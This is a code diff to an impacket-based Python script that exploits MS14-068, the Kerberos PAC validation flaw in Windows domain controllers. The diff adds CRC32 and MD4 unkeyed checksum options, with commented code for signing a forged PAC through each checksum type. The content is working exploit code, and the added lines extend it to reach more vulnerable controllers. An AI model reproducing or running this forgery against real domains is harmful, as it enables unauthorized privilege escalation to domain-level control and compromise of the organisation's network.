@@ -34,6 +34,8 @@
 #       to the hosts file
 #
 
+import struct
+import binascii
 from impacket.dcerpc.v5 import ndr
 from impacket.dcerpc.v5.ndr import NDRCALL, NDR
 from impacket.dcerpc.v5.dtypes import *
@@ -601,6 +603,10 @@ class RemoteStdInPipe(Pipes):
 
 
 class MS14_068():
+    # 6.1.  Unkeyed Checksums
+    # Vulnerable DCs are accepting at least these unkeyed checksum types
+    CRC_32  = 1
+    RSA_MD4 = 2
     RSA_MD5 = 7
     class VALIDATION_INFO(TypeSerialization1):
         structure = (
@@ -706,15 +712,37 @@ class MS14_068():
 
         # 3) PAC_SERVER_CHECKSUM/PAC_SIGNATURE_DATA
         serverChecksum = PAC_SIGNATURE_DATA()
+
+        # If you wanna do CRC32, uncomment this
+        #serverChecksum['SignatureType'] = self.CRC_32
+        #serverChecksum['Signature'] = '\x00'*4
+
+        # If you wanna do MD4, uncomment this
+        #serverChecksum['SignatureType'] = self.RSA_MD4
+        #serverChecksum['Signature'] = '\x00'*16
+
+        # If you wanna do MD5, uncomment this
         serverChecksum['SignatureType'] = self.RSA_MD5
         serverChecksum['Signature'] = '\x00'*16
+
         serverChecksumBlob = str(serverChecksum)
         serverChecksumAlignment = '\x00'*(((len(serverChecksumBlob)+7)/8*8)-len(serverChecksumBlob))
 
         # 4) PAC_PRIVSVR_CHECKSUM/PAC_SIGNATURE_DATA
         privSvrChecksum = PAC_SIGNATURE_DATA()
+
+        # If you wanna do CRC32, uncomment this
+        #privSvrChecksum['SignatureType'] = self.CRC_32
+        #privSvrChecksum['Signature'] = '\x00'*4
+
+        # If you wanna do MD4, uncomment this
+        #privSvrChecksum['SignatureType'] = self.RSA_MD4
+        #privSvrChecksum['Signature'] = '\x00'*16
+
+        # If you wanna do MD5, uncomment this
         privSvrChecksum['SignatureType'] = self.RSA_MD5
         privSvrChecksum['Signature'] = '\x00'*16
+
         privSvrChecksumBlob = str(privSvrChecksum)
         privSvrChecksumAlignment = '\x00'*(((len(privSvrChecksumBlob)+7)/8*8)-len(privSvrChecksumBlob))
 
@@ -758,8 +786,17 @@ class MS14_068():
 
         blobToChecksum = str(pacType)
 
+        # If you want to do CRC-32, ucomment this
+        #serverChecksum['Signature'] = struct.pack('<L', (binascii.crc32(blobToChecksum, 0xffffffff) ^ 0xffffffff) & 0xffffffff)
+        #privSvrChecksum['Signature'] =  struct.pack('<L', (binascii.crc32(serverChecksum['Signature'], 0xffffffff) ^ 0xffffffff) & 0xffffffff)
+
+        # If you want to do MD4, ucomment this
+        #serverChecksum['Signature'] = MD4.new(blobToChecksum).digest()
+        #privSvrChecksum['Signature'] =  MD4.new(serverChecksum['Signature']).digest()
+
+        # If you want to do MD5, ucomment this
         serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
-        privSvrChecksum['Signature'] =  MD5.new(serverChecksum['Signature']).digest()
+        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest() 
 
         buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
@@ -974,7 +1011,7 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5.ndr import NDRULONG
     from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
     from pyasn1.codec.der import decoder, encoder
-    from Crypto.Hash import MD5
+    from Crypto.Hash import MD5, MD4
 
 
     print version.BANNER
